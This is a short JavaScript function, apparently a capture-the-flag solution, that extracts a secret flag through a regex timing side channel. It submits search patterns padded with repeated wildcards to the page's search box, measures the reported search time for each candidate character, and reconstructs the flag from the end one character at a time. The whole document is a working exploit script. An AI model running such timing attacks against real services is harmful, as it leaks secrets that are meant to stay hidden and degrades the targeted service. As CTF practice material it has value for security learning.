async function solve() {
  const sleep = (t) => new Promise(resolve => setTimeout(resolve, t));
  const header = "flag";
  let res = "}";
  const chars = "abcdefghijklmnopqrstuvwxyz{";
  while (true) {
    let min_time = 1000000;
    let min_char = "X";
    for (const c of chars) {
      const reg = `^${header}.*.*.*.*.*.*.${c}${res}`;
      input_flag.value = reg;
      searching();
      await sleep(500);
      const spent = parseInt(document.querySelector("h4").textContent);
      if (min_time > spent) {
        min_time = spent;
        min_char = c;
      }
    }
    res = min_char + res;
    console.log(`solve: use ${min_char} with ${min_time} millisec`);
    if (min_char == "{") {
      break;
    }
  }
  res = header + res;
  alert("flag is:" + res);
}
